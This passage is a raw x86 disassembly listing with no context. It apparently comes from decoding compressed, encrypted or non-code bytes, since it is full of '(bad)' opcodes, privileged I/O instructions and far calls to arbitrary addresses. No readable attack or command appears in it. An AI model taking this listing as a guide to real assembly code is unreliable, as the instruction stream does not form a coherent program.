  40899d:	cmp    DWORD PTR [eax],edi
  40899f:	repz out 0xef,al
  4089a2:	jnp    0x408978
  4089a4:	mov    dh,0x8c
  4089a6:	pusha  
  4089a7:	mov    edi,0xde89f31a
  4089ac:	cmp    BYTE PTR [edx+0x1e8e4044],al
  4089b2:	mov    ch,0x9e
  4089b4:	sti    
  4089b5:	pop    ds
  4089b6:	mov    al,ds:0xa84a6448
  4089bb:	loopne 0x4089e7
  4089bd:	fidivr WORD PTR [edi+0x76]
  4089c0:	je     0x408a05
  4089c2:	push   eax
  4089c3:	nop
  4089c4:	mov    BYTE PTR [esp+ecx*2],ah
  4089c7:	dec    eax
  4089c8:	jmp    0x1081:0x3c58a947
  4089cf:	inc    eax
  4089d0:	mov    bh,0xfd
  4089d2:	ins    DWORD PTR es:[edi],dx
  4089d3:	hlt    
  4089d4:	mov    BYTE PTR [ecx],dh
  4089d6:	pop    ebx
  4089d7:	xchg   edx,eax
  4089d8:	mov    ds:0xab897422,al
  4089dd:	lds    edi,FWORD PTR [edx+0x493c920f]
  4089e3:	call   eax
  4089e5:	fld    TBYTE PTR ds:0x42f3050a
  4089eb:	or     eax,0x35283964
  4089f0:	call   0x9e9cf7a3
  4089f5:	xor    bh,BYTE PTR [ebx-0x3f176fa8]
  4089fb:	nop
  4089fc:	dec    ebp
  4089fd:	xchg   edx,eax
  4089fe:	jp     0x408994
  408a00:	sub    al,0x8
  408a02:	xchg   edx,eax
  408a03:	inc    esi
  408a04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a05:	addps  xmm2,XMMWORD PTR [edi+eax*8]
  408a09:	xor    esp,ebp
  408a0b:	jg     0x408995
  408a0d:	lods   eax,DWORD PTR ds:[esi]
  408a0e:	mov    ch,0x15
  408a10:	fist   WORD PTR [ecx-0xe17ec9f]
  408a16:	add    BYTE PTR [esi+0x20e50b6f],bl
  408a1c:	pop    ds
  408a1d:	add    ch,BYTE PTR [eax+0x12]
  408a20:	xor    eax,0x59a7a472
  408a25:	popa   
  408a26:	mov    bl,BYTE PTR [eax-0x5c50a13a]
  408a2c:	sub    al,0xe5
  408a2e:	lods   eax,DWORD PTR ds:[esi]
  408a2f:	xchg   ebx,eax
  408a30:	in     al,0x3
  408a32:	inc    ecx
  408a33:	mov    ah,0x79
  408a35:	ss dec ebp
  408a37:	mov    al,ds:0xf7a43832
  408a3c:	pop    edi
  408a3d:	dec    ebx
  408a3e:	mov    edx,0xeba24392
  408a43:	or     al,0xfe
  408a45:	mov    eax,0x1c203c47
  408a4a:	adc    edi,ebx
  408a4c:	sub    al,0xc2
  408a4e:	loope  0x408a2e
  408a50:	jb     0x408a93
  408a52:	push   edx
  408a53:	jo     0x408a7d
  408a55:	mov    al,ds:0xb2bcbfb
  408a5a:	shr    ah,0x1b
  408a5d:	and    DWORD PTR [esi+0x1c],edx
  408a60:	daa    
  408a61:	(bad)  
  408a62:	in     al,0xea
  408a64:	and    DWORD PTR [ecx+edx*4+0x47],esp
  408a68:	add    ah,BYTE PTR [edi+0x73a4c0ec]
  408a6e:	mov    ds:0x223a3f95,eax
  408a73:	dec    ebx
  408a74:	and    DWORD PTR [esi+0x46],eax
  408a77:	stc    
  408a78:	add    BYTE PTR [edi-0x18fde0a8],0xdf
  408a7f:	dec    edx
  408a80:	ret    0xa2cf
  408a83:	jecxz  0x408a37
  408a85:	loope  0x408a89
  408a87:	mov    dh,0x5c
  408a89:	and    cl,bl
  408a8b:	aaa    
  408a8c:	or     edx,DWORD PTR [edi]
  408a8e:	and    al,0xee
  408a90:	inc    edx
  408a91:	and    DWORD PTR [ecx+0x4f],esi
  408a94:	xchg   esi,eax
  408a95:	mov    al,ds:0x925b935b
  408a9a:	popa   
  408a9b:	clc    
  408a9c:	mov    ebx,0x9cb261e8
  408aa1:	fcmovne st,st(2)
  408aa3:	ins    BYTE PTR es:[edi],dx
  408aa4:	aaa    
  408aa5:	pop    edx
  408aa6:	clc    
  408aa7:	out    0x77,eax
  408aa9:	adc    BYTE PTR [esi],bh
  408aab:	or     BYTE PTR [ebx+0x15341d8b],bh
  408ab1:	and    BYTE PTR [edi-0x7d],bl
  408ab4:	out    0xef,eax
  408ab6:	imul   esp,ebp,0x79cc173e
  408abc:	lahf   
  408abd:	pusha  
  408abe:	inc    edx
  408abf:	add    BYTE PTR [eax+0x7],dh
  408ac2:	ror    DWORD PTR [ebp+ebp*2+0x74c821a2],1
  408ac9:	inc    edx
  408aca:	and    esp,DWORD PTR [edi-0x5cd148fb]
  408ad0:	call   0x60a4:0x4fa2d676
  408ad7:	pushf  
  408ad8:	xchg   ecx,eax
  408ad9:	fisub  DWORD PTR [eax+edi*8+0x1d2f82bc]
  408ae0:	xor    eax,0x94e8e037
  408ae5:	cmp    DWORD PTR [esi],0xffffffe7
  408ae8:	icebp  
  408ae9:	jp     0x408b51
  408aeb:	and    DWORD PTR [edi-0x2e43ed5d],esi
  408af1:	push   edx
  408af2:	stos   DWORD PTR es:[edi],eax
  408af3:	(bad)  [edi]
  408af5:	loop   0x408b54
  408af7:	push   ebx
  408af8:	jp     0x408b4b
  408afa:	pop    edx
  408afb:	pop    esi
  408afc:	int    0x69
  408afe:	dec    esp
  408aff:	(bad)  
  408b00:	daa    
  408b01:	pushf  
  408b02:	pop    eax
  408b03:	(bad)  
  408b04:	xchg   ebp,eax
  408b05:	stos   DWORD PTR es:[edi],eax
  408b06:	adc    ebp,DWORD PTR [ecx]
  408b08:	sbb    eax,0x280df5c6
  408b0d:	dec    ebp
  408b0e:	(bad)  
  408b0f:	out    dx,eax
  408b10:	sbb    esi,edi
  408b12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b13:	mov    cl,0xcf
  408b15:	sbb    eax,0xc7e3af7b
  408b1a:	xor    esp,esp
  408b1c:	xchg   edx,eax
  408b1d:	int3   
  408b1e:	cmp    edi,DWORD PTR [ecx]
  408b20:	mov    ebx,0xb13549d5
  408b25:	inc    esp
  408b26:	pop    edi
  408b27:	test   DWORD PTR [ecx],edx
  408b29:	cmp    BYTE PTR [edx],0x46
  408b2c:	imul   edx
  408b2e:	loopne 0x408b9d
  408b30:	xor    cl,ch
  408b32:	jo     0x408b57
  408b34:	add    al,0xec
  408b36:	(bad)
  408b39:	mov    ebx,esi
  408b3b:	outs   dx,DWORD PTR ds:[esi]
  408b3c:	stos   BYTE PTR es:[edi],al
  408b3d:	(bad)  
  408b3e:	pop    esi
  408b3f:	mov    eax,0x73a1810c
  408b44:	out    dx,eax
  408b45:	adc    al,0xd4
  408b47:	xchg   esi,eax
  408b48:	or     ecx,DWORD PTR [esi]
  408b4a:	imul   ebx,DWORD PTR [edi],0x22
  408b4d:	or     ah,dl
  408b4f:	stc    
  408b50:	fbld   TBYTE PTR [edx]
  408b52:	inc    ebp
  408b53:	dec    ecx
  408b54:	mov    edx,0x81ead042
  408b59:	sub    BYTE PTR [ecx+0x3e],0x6f
  408b5d:	fwait
  408b5e:	ds adc al,0x97
  408b61:	test   eax,0xbbe9d735
  408b66:	clc    
  408b67:	shl    DWORD PTR [esi],0xf8
  408b6a:	cmp    eax,0x9dc01673
  408b6f:	dec    esp
  408b70:	xor    edx,DWORD PTR [esi+eiz*4-0x12]
  408b74:	lods   al,BYTE PTR ds:[esi]
  408b75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b76:	(bad)  
  408b77:	sbb    al,0xad
  408b79:	enter  0xb6a0,0x39
  408b7d:	fstp   QWORD PTR ds:[edi]
  408b80:	cmp    dh,BYTE PTR [esi]
  408b82:	stos   DWORD PTR es:[edi],eax
  408b83:	scas   al,BYTE PTR es:[edi]
  408b84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b85:	add    edx,DWORD PTR [edi-0x1329296b]
  408b8b:	or     BYTE PTR [ebp+0xc],bh
  408b8e:	add    BYTE PTR [ebx],ch
  408b90:	retf   
  408b91:	dec    ebx
  408b92:	mov    esp,DWORD PTR [esi-0x17f4c5b3]
  408b98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b99:	call   0xc7b5:0x66b6bc9a
  408ba0:	mov    dh,0x6e
  408ba2:	in     eax,dx
  408ba3:	xchg   edi,eax
  408ba4:	(bad)  
  408ba5:	test   BYTE PTR [ebx+eax*1],ah
  408ba8:	inc    eax
  408ba9:	mov    cl,0x40
  408bab:	xchg   edi,eax
  408bac:	test   BYTE PTR [eax+0x56],cl
  408baf:	cwde   
  408bb0:	sbb    BYTE PTR [edx],ch
  408bb2:	pop    edx
  408bb3:	pop    edi
  408bb4:	(bad)  
  408bb5:	mov    esp,0xd1e3a070
  408bba:	adc    DWORD PTR [eax+0x2b],ebp
  408bbd:	adc    ebx,DWORD PTR [ecx+eax*2-0x7f4eb37c]
  408bc4:	xchg   ebx,eax
  408bc5:	adc    BYTE PTR ds:0xf32a0636,dl
  408bcb:	jl     0x408bb2
  408bcd:	pusha  
  408bce:	shr    DWORD PTR [esi-0x7f752c45],1
  408bd4:	sar    eax,0xd5
  408bd7:	outs   dx,BYTE PTR ds:[esi]
  408bd8:	inc    ebp
  408bd9:	pop    edi
  408bda:	fisub  WORD PTR [esi+0x68]
  408bdd:	mov    eax,0xe1ee358e
  408be2:	xchg   ebx,eax
  408be3:	pop    esp
  408be4:	dec    ebx
  408be5:	pop    edi
  408be6:	sbb    al,0x50
  408be8:	(bad)  
  408be9:	fmul   QWORD PTR [eax+esi*2]
  408bec:	xchg   edx,eax
  408bed:	aam    0x69
  408bef:	mov    dl,0x2a
  408bf1:	jmp    0x4d8d9809
  408bf6:	cmp    DWORD PTR [esi-0xd],esi
  408bf9:	jae    0x408c6f
  408bfb:	popf   
  408bfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bfd:	cs ja  0x408bc7
  408c00:	jp     0x408be5
  408c02:	inc    edi
  408c03:	cmp    al,0x4f
  408c05:	jg     0x408bf6
  408c07:	jns    0x408c16
  408c09:	jmp    0x408bf0
  408c0b:	push   ebx
  408c0c:	rcl    dl,1
  408c0e:	leave  
  408c0f:	scas   eax,DWORD PTR es:[edi]
  408c10:	cmc    
  408c11:	nop
  408c12:	sar    DWORD PTR [esi],cl
  408c14:	xlat   BYTE PTR ds:[ebx]
  408c15:	scas   eax,DWORD PTR es:[edi]
  408c16:	adc    eax,0xffffffa1
  408c19:	bound  eax,QWORD PTR [edx]
  408c1b:	mov    edx,0x6ece3dc1
  408c20:	pop    ebx
  408c21:	inc    esp
  408c22:	inc    edi
  408c23:	sub    bl,BYTE PTR [ebp+0x79667578]
  408c29:	aas    
  408c2a:	arpl   cx,di
  408c2c:	xlat   BYTE PTR ds:[ebx]
  408c2d:	dec    eax
  408c2e:	test   BYTE PTR [eax-0x23],cl
  408c31:	(bad)  
  408c32:	(bad)  
  408c34:	out    0x57,al
  408c36:	lock arpl WORD PTR [ecx+ebx*4],di
  408c3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c3b:	or     DWORD PTR [edi],0xffffffaf
  408c3e:	sub    BYTE PTR [esi+esi*8],al
  408c41:	das    
  408c42:	out    0xd9,al
  408c44:	mov    eax,0x669e5651
  408c49:	pop    edx
  408c4a:	(bad)  
  408c4b:	cmp    bh,BYTE PTR [ebx+ebp*8-0x7fa8248b]
  408c52:	mov    bl,0x55
  408c54:	lea    eax,[eax+edx*1+0x20]
  408c58:	(bad)  
  408c59:	mov    al,ds:0xa087395e
  408c5e:	sub    al,0xb2
  408c60:	and    eax,0xc46fb81f
  408c65:	mov    cl,0x99
  408c67:	lods   al,BYTE PTR ds:[esi]
  408c68:	and    bl,bh
  408c6a:	xchg   edi,eax
  408c6b:	mov    al,ds:0x52162830
  408c70:	clc    
  408c71:	mov    ds:0x53d21e1a,eax
  408c76:	aaa    
  408c77:	cmc    
  408c78:	dec    edx
  408c79:	pop    edi
  408c7a:	and    DWORD PTR [ebx],ebx
  408c7c:	and    al,0xd1
  408c7e:	fnop   
  408c80:	pop    ebx
  408c81:	pop    ss
  408c82:	mov    ecx,0xa9d75e37
  408c87:	sbb    ecx,esp
  408c89:	rcl    BYTE PTR [eax],1
  408c8b:	jmp    0x408c47
  408c8d:	in     eax,0x78
  408c8f:	jo     0x408cca
  408c91:	imul   ebp,DWORD PTR [edx+edx*8+0x1f57ee8e],0x2c
  408c99:	sbb    ah,ah
  408c9b:	ds repz aad 0x29
  408c9f:	outs   dx,BYTE PTR ds:[esi]
  408ca0:	lods   al,BYTE PTR ds:[esi]
  408ca1:	or     ebp,eax
  408ca3:	mov    al,ds:0x87b4c086
  408ca8:	push   ebp
  408ca9:	adc    esp,DWORD PTR [ebp+0x7ae655f3]
  408caf:	into   
  408cb0:	out    dx,al
  408cb1:	fistp  DWORD PTR [eax]
  408cb3:	icebp  
  408cb4:	or     DWORD PTR [ebx-0x1d],0x39
  408cb8:	inc    esp
  408cb9:	mov    dh,ch
  408cbb:	mov    cl,0xb8
  408cbd:	ror    esp,cl
  408cbf:	jl     0x408ca0
  408cc1:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  408cc3:	loop   0x408d36
  408cc5:	mov    ds:0xffb916ed,al
  408cca:	dec    eax
  408ccb:	es pop ss
  408ccd:	lods   eax,DWORD PTR ds:[esi]
  408cce:	or     al,0x2a
  408cd0:	xchg   ecx,eax
  408cd1:	sahf   
  408cd2:	jns    0x408c6a
  408cd4:	clc    
  408cd5:	mov    BYTE PTR [edi],cl
  408cd7:	addr16 jp 0x408cf5
  408cda:	(bad)  
  408cdb:	and    al,ah
  408cdd:	jp     0x408d15
  408cdf:	jmp    0xc3dacf51
  408ce4:	ds imul eax,esp,0xffffffd8
  408ce8:	pop    edi
  408cea:	ds lock cld 
  408ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cee:	out    0x43,al
  408cf0:	cmp    BYTE PTR [ebx-0x7714920e],dl
  408cf6:	xor    dh,al
  408cf8:	cwde   
  408cf9:	sub    bl,ah
  408cfb:	or     edx,edx
  408cfd:	push   eax
  408cfe:	test   ebx,0x4b517e32
  408d04:	cmc    
  408d05:	icebp  
  408d06:	fwait
  408d07:	into   
  408d08:	retf   
  408d09:	popf   
  408d0a:	pop    ss
  408d0b:	loope  0x408d1b
  408d0d:	inc    edi
  408d0e:	and    eax,0xf2d4e2c7
  408d13:	adc    DWORD PTR ds:0xe277d042,ebp
  408d19:	jecxz  0x408d64
  408d1b:	add    DWORD PTR [edi+0x5b],0xcacb5a
  408d22:	test   al,0x9d
  408d24:	xor    BYTE PTR [ebx+0x49],ch
  408d27:	scas   al,BYTE PTR es:[edi]
  408d28:	cmp    al,0x3b
  408d2a:	pop    es
  408d2b:	test   eax,0xe3415095
  408d30:	inc    esp
  408d31:	adc    eax,0x83068e9e
  408d36:	cmc    
  408d37:	iret   
  408d38:	sub    bh,dh
  408d3a:	cmp    esp,DWORD PTR [esi]
  408d3c:	xchg   ebx,eax
  408d3d:	sbb    DWORD PTR [esi],0xaf88504e
  408d43:	mov    eax,0xe893d32b
  408d48:	bound  ebp,QWORD PTR [edi+eiz*2]
  408d4b:	sbb    BYTE PTR ds:0x19d41187,cl
  408d51:	xor    edi,DWORD PTR [ebx+0x1f]
  408d54:	fld    QWORD PTR [ebx+0x5b]
  408d57:	mov    esp,0xc8555c2c
  408d5c:	test   eax,0x827888b3
  408d61:	mov    bl,0x4
  408d63:	and    al,0x6
  408d65:	jnp    0x408d0d
  408d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d69:	mov    ch,0x50
  408d6b:	pusha  
  408d6c:	loopne 0x408d56
  408d6e:	mov    dh,0x5a
  408d70:	dec    edi
  408d71:	aaa    
  408d72:	std    
  408d73:	mov    al,0xd7
  408d75:	(bad)  
  408d76:	fdiv   QWORD PTR [ecx]
  408d78:	mov    bl,0xe1
  408d7a:	xchg   esi,eax
  408d7b:	mov    ds:0x282e480e,al
  408d80:	pop    ebp
  408d81:	adc    esi,ebx
  408d83:	jbe    0x408d9e
  408d85:	adc    eax,0x2e287593
  408d8a:	pop    ebx
  408d8b:	call   0x9f90:0xe3de231f
  408d92:	pop    ebx
  408d93:	sub    eax,0xfb93a9c
  408d98:	adc    BYTE PTR [ebx-0x10],cl
  408d9b:	js     0x408d32
  408d9d:	ja     0x408e02
  408d9f:	push   es
  408da0:	fcom   QWORD PTR [ebp+0x6c380ce4]
  408da6:	push   eax
  408da7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408da8:	cdq    
  408da9:	inc    edi
  408daa:	xchg   esi,eax
  408dab:	push   0x15
  408dad:	and    bl,dh
  408daf:	or     BYTE PTR ds:0xe642b075,0x57
  408db6:	mov    ebx,DWORD PTR [esi]
  408db8:	sbb    DWORD PTR [esi],edx
  408dba:	jl     0x408de5
  408dbc:	mov    esi,DWORD PTR [eax+0x63]
  408dbf:	popa   
  408dc0:	sbb    bh,BYTE PTR ds:0x6d96c8de
  408dc6:	add    al,0x53
  408dc8:	cld    
  408dc9:	mov    WORD PTR [ebp+0x0],?
  408dcc:	sti    
  408dcd:	inc    ebx
  408dce:	stos   DWORD PTR es:[edi],eax
  408dcf:	push   ss
  408dd0:	or     BYTE PTR [ebp-0x4d],ah
  408dd3:	pop    ds
  408dd4:	scas   eax,DWORD PTR es:[edi]
  408dd5:	jmp    0x19e90231
  408dda:	retf   
  408ddb:	xor    dl,dh
  408ddd:	pop    ebx
  408dde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ddf:	push   cs
  408de0:	jmp    DWORD PTR [edx]
  408de2:	adc    al,0x79
  408de4:	push   0xfffffffe
  408de6:	out    0x6f,eax
  408de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408de9:	call   0xca2b:0xdd7251b7
  408df0:	retf   0x8e32
  408df3:	std    
  408df4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408df5:	push   cs
  408df6:	lds    eax,FWORD PTR [esi+0x28292ff]
  408dfc:	dec    ebp
  408dfd:	(bad)  
  408dfe:	retf   0x234
  408e01:	mov    DWORD PTR [esi+ebp*4+0x51],esi
  408e05:	retf   
  408e06:	adc    ecx,DWORD PTR [edi]
  408e08:	dec    eax
  408e09:	mov    dh,BYTE PTR [edi]
  408e0b:	dec    eax
  408e0c:	jne    0x408dac
  408e0e:	or     bh,BYTE PTR ds:0x5f274116
  408e14:	loope  0x408e5a
  408e16:	push   0x58
  408e18:	xor    ah,bl
  408e1a:	clc    
  408e1b:	sbb    DWORD PTR [ebx],ebp
  408e1d:	out    0x64,al
  408e1f:	mov    dl,dl
  408e21:	xor    esi,DWORD PTR [ebp+0x235c481d]
  408e27:	add    ebx,DWORD PTR [ebx]
  408e29:	stc    
  408e2a:	add    DWORD PTR [eax+0x3835d266],0x13
  408e31:	jae    0x408e3a
  408e33:	ja     0x408dd0
  408e35:	adc    DWORD PTR [ecx],0x59
  408e38:	mov    esi,0x6215e7c1
  408e3d:	fisub  WORD PTR [eax]
  408e3f:	ret    0xe21d
  408e42:	sbb    bh,BYTE PTR [edi+0x3cb6b533]
  408e48:	push   ss
  408e49:	add    BYTE PTR [eax-0x50c4fda0],al
  408e4f:	outs   dx,BYTE PTR ds:[esi]
  408e50:	adc    eax,0x7cb99fe4
  408e55:	xchg   edx,eax
  408e56:	mov    dl,0xf
  408e58:	aam    0xaa
  408e5a:	loope  0x408de8
  408e5c:	fwait
  408e5d:	push   ebp
  408e5e:	(bad)  
  408e5f:	xor    ch,BYTE PTR [ebp-0x5d06a0a]
  408e65:	(bad)  
  408e67:	push   ss
  408e68:	pop    edx
  408e69:	mov    ecx,0xb492574f
  408e6e:	push   esp
  408e6f:	and    eax,0x4abf6a86
  408e74:	mov    ebp,0x8740dcd6
  408e79:	xor    bh,BYTE PTR [eax]
  408e7b:	icebp  
  408e7c:	or     al,0x6d
  408e7e:	bnd jnp 0x408e11
  408e81:	mov    esp,0x5b051a60
  408e86:	inc    ecx
  408e87:	call   0xd162:0x755b3ee8
  408e8e:	xor    al,0x2
  408e90:	clc    
  408e91:	jne    0x408ed7
  408e93:	add    DWORD PTR [edi],0x1acff07e
  408e99:	sbb    eax,0xd72d82ce
  408e9e:	int3   
  408e9f:	sub    al,0x36
  408ea1:	cmp    edx,DWORD PTR [ebp-0x2a]
  408ea4:	dec    ecx
  408ea5:	xor    esi,DWORD PTR [edi+ecx*4]
  408ea8:	xchg   edi,eax
  408ea9:	les    esi,FWORD PTR [edx]
  408eab:	(bad)  
  408eac:	fwait
  408ead:	pop    eax
  408eae:	(bad)  
  408eaf:	cmp    al,0xcb
  408eb1:	pop    eax
  408eb2:	push   ebx
  408eb3:	icebp  
  408eb4:	xchg   ecx,eax
  408eb5:	pop    edx
  408eb6:	sub    al,0x5a
  408eb8:	xor    eax,0x89df14c7
  408ebd:	cwde   
  408ebe:	mov    ch,0xdb
  408ec0:	add    ch,BYTE PTR [ecx]
  408ec2:	addr16 xchg bl,ch
  408ec5:	inc    esp
  408ec6:	sub    al,0x7
  408ec8:	push   0x18997a61
  408ecd:	mov    cl,0x5e
  408ecf:	add    BYTE PTR ds:0xdfcfc975,ch
  408ed5:	sbb    ebx,edx
  408ed7:	or     ecx,DWORD PTR [eax-0x627f02b]
  408edd:	aad    0x9d
  408edf:	mov    dl,0xb6
  408ee1:	push   esi
  408ee2:	nop
  408ee3:	mov    ah,0x1a
  408ee5:	sbb    ah,BYTE PTR [edi+0x2a]
  408ee8:	lods   al,BYTE PTR ds:[esi]
  408ee9:	jns    0x408e8a
  408eeb:	jmp    0x408ebb
  408eed:	loop   0x408f6c
  408eef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ef0:	fcom   DWORD PTR [ebx]
  408ef2:	clc    
  408ef3:	sub    eax,0x95b723a6
  408ef8:	call   0xdfc3:0x4965d86
  408eff:	aas    
  408f00:	cwde   
  408f01:	cmp    BYTE PTR [eax-0x202d2d9c],bl
  408f07:	add    edx,DWORD PTR [edi-0x21537cb6]
  408f0d:	add    ebx,DWORD PTR [edx-0x52]
  408f10:	cwde   
  408f11:	leave  
  408f12:	ror    BYTE PTR [ecx],1
  408f14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f15:	xor    ch,BYTE PTR [edi]
  408f17:	xchg   BYTE PTR [eax+ebx*4+0x11],ah
  408f1b:	inc    eax
  408f1c:	push   0x46d163f7
  408f21:	icebp  
  408f22:	sub    DWORD PTR [eax],ebp
  408f24:	js     0x408ecf
  408f26:	cld    
  408f27:	mov    al,ds:0xe83a3271
  408f2c:	es daa 
  408f2e:	out    dx,eax
  408f2f:	pop    es
  408f30:	shl    BYTE PTR [esi+0x6aa9edcb],cl
  408f36:	sar    DWORD PTR [esi+0x59922883],cl
  408f3c:	imul   BYTE PTR [edx]
  408f3e:	cmp    al,0xe9
  408f40:	dec    eax
  408f41:	adc    al,0x6
  408f43:	and    al,0xef
  408f45:	add    BYTE PTR [esi-0x3b],ch
  408f48:	(bad)  
  408f49:	mov    edx,0x3543ddf5
  408f4e:	jbe    0x408f2c
  408f50:	xor    cl,BYTE PTR [ebp+0xa]
  408f53:	inc    ebx
  408f54:	pusha  
  408f55:	lahf   
  408f56:	sbb    ebp,DWORD PTR [edi-0xc]
  408f59:	clc    
  408f5a:	jecxz  0x408ee3
  408f5c:	(bad)  
  408f5e:	pop    ebx
  408f5f:	bound  ebx,QWORD PTR [esp+edi*1-0x52]
  408f63:	(bad)  
  408f65:	pop    esp
  408f66:	dec    eax
  408f67:	sbb    eax,0xb986ff65
  408f6c:	dec    edx
  408f6d:	dec    ebx
  408f6e:	or     al,0xd1
  408f70:	idiv   DWORD PTR [ecx-0x45]
  408f73:	mov    ah,0x9c
  408f75:	(bad)  
  408f77:	and    bh,BYTE PTR [eax+esi*2+0x53]
  408f7b:	mov    ds:0xe985394c,al
  408f80:	out    dx,al
  408f81:	mov    cl,0x2
  408f83:	cmp    ecx,DWORD PTR [esi]
  408f85:	addr16 mov ecx,0xfb0188f1
  408f8b:	cld    
  408f8c:	in     al,0x3b
  408f8e:	fnop   
  408f90:	mov    BYTE PTR [esi],bh
  408f92:	cmp    DWORD PTR [ebp+0x1f851a06],ecx
  408f98:	test   al,0x7
  408f9a:	mov    bh,dl
  408f9c:	jae    0x408fac
  408f9e:	inc    ecx
  408f9f:	mov    WORD PTR [ebx-0xd5ff504],es
  408fa5:	or     DWORD PTR [eax+edx*4+0x5e9baf1a],esi
  408fac:	jmp    0x408fad
  408fae:	jbe    0x408f8b
  408fb0:	and    ebp,DWORD PTR [esp+ebp*8-0x6]
  408fb4:	dec    eax
  408fb5:	adc    ch,BYTE PTR [esp+edx*1-0x15]
  408fb9:	push   cs
  408fba:	sar    dh,cl
  408fbc:	adc    eax,0xc5c2f546
  408fc1:	mov    bl,0x7f
  408fc3:	sub    eax,DWORD PTR [eax+edx*2+0x1ecb918d]
  408fca:	mov    bh,0x97
  408fcc:	or     bl,bl
  408fce:	daa    
  408fcf:	cmp    al,0xd1
  408fd1:	imul   esi,DWORD PTR [edx],0x3b165a00
  408fd7:	(bad)  
  408fd8:	rsqrtps xmm6,xmm0
  408fdb:	loop   0x408fdc
  408fdd:	(bad)  
  408fde:	hlt    
  408fdf:	mov    ebx,0xdc66baf
  408fe4:	sub    dl,bh
  408fe6:	sbb    ch,BYTE PTR [edi]
  408fe8:	push   ebx
  408fe9:	adc    cl,BYTE PTR [edi-0x410c0c9a]
  408fef:	or     DWORD PTR [ebp+eiz*8-0x34],0xffffff9b
  408ff4:	enter  0x895b,0xd0
  408ff8:	mov    ah,0xbb
  408ffa:	mov    esi,0x16a784d4
  408fff:	inc    ebp
  409000:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409001:	lahf   
  409002:	and    al,0x69
  409004:	jne    0x409014
  409006:	imul   esp,ebx,0x1200817b
  40900c:	mov    edx,0xc7613b96
  409011:	mov    cl,0xb8
  409013:	call   0xb664:0x9e86c47a
  40901a:	xchg   edi,eax
  40901b:	and    eax,0x6bca2f18
  409020:	(bad)  
  409021:	dec    ebp
  409022:	stc    
  409023:	ds adc BYTE PTR ss:[ebp-0x1a06b74a],al
  40902b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40902c:	pop    ds
  40902d:	push   ss
  40902e:	gs sbb al,0x96
  409031:	fwait
  409032:	mov    ah,0x18
  409034:	pop    ds
  409035:	fcom   DWORD PTR [edi]
  409037:	ficom  WORD PTR [edi-0x5b]
  40903a:	call   0x43a3272b
  40903f:	dec    edx
  409040:	(bad)
  409043:	sar    BYTE PTR [esi*2-0x514e2e24],cl
  40904a:	aad    0x25
  40904c:	jns    0x4090a3
  40904e:	mov    edi,0x4b6dbb92
  409053:	(bad)  
  409054:	mov    al,0x33
  409056:	(bad)  
  409057:	int    0xa6
  409059:	pop    eax
  40905a:	pop    ecx
  40905b:	adc    al,0x65
  40905d:	icebp  
  40905e:	xor    BYTE PTR [edi],0xe7
  409061:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409062:	out    0x77,eax
  409064:	mov    ebp,0x6ace895c
  409069:	adc    BYTE PTR [ecx+0x13],bl
  40906c:	repz xor ch,BYTE PTR [edi+edi*2+0x53]
  409071:	mov    eax,0x932bb927
  409076:	mov    ebx,0xd0faaed0
  40907b:	cmp    cl,BYTE PTR [ecx-0x4a9bf95d]
  409081:	imul   ebx,DWORD PTR [ebx-0x50],0x48ce5227
  409088:	mov    ah,0xfe
  40908a:	mov    BYTE PTR [ecx+0x29],al
  40908d:	cs ss pop ss
  409090:	push   cs
  409091:	mov    ds:0x3f4f4dcd,eax
  409096:	xor    eax,DWORD PTR [ebx-0x47]
  409099:	js     0x409073
  40909b:	xchg   edi,eax
  40909c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40909d:	inc    esi
  40909e:	int3   
  40909f:	add    ah,BYTE PTR [esi-0x26cfa29a]
  4090a5:	test   BYTE PTR [esi+0x2a],bl
  4090a8:	fistp  DWORD PTR [ebx]
  4090aa:	in     eax,dx
  4090ab:	push   0xe8480498
  4090b0:	ror    edx,cl
  4090b2:	iret   
  4090b3:	repnz sbb al,0x2b
  4090b6:	mov    edi,0x3c1a828b
  4090bb:	popf   
  4090bc:	push   ecx
  4090bd:	mov    bh,0x10
  4090bf:	stc    
  4090c0:	ss pusha 
  4090c2:	cmp    ebx,DWORD PTR [eax]
  4090c4:	mov    ch,0xbd
  4090c6:	and    ebp,DWORD PTR [ebx+0x468eb035]
  4090cc:	(bad)  
  4090cd:	call   0x95ffadae
  4090d2:	outs   dx,BYTE PTR ds:[esi]
  4090d3:	fnsave [edi]
  4090d5:	adc    DWORD PTR [ecx],0x9b709597
  4090db:	mov    dh,0x68
  4090dd:	out    dx,al
  4090de:	jbe    0x409117
  4090e0:	sub    DWORD PTR [edx],ebx
  4090e2:	inc    ebx
  4090e3:	cmp    DWORD PTR [ecx],edx
  4090e5:	arpl   WORD PTR [ebx-0x141ca0ea],bp
  4090eb:	and    ah,BYTE PTR [ebp+0x31]
  4090ee:	fidiv  WORD PTR [edi-0x522f4d0f]
  4090f4:	ins    DWORD PTR es:[edi],dx
  4090f5:	jmp    0x4090fd
  4090f7:	fucomi st,st(5)
  4090f9:	lock inc ecx
  4090fb:	cmc    
  4090fc:	(bad)  [esp+eax*4+0x4add17c1]
  409103:	aad    0xe7
  409105:	outs   dx,DWORD PTR ds:[esi]
  409106:	inc    ecx
  409107:	into   
  409108:	scas   al,BYTE PTR es:[edi]
  409109:	das    
  40910a:	cmc    
  40910b:	or     DWORD PTR [ebx+0x15],esp
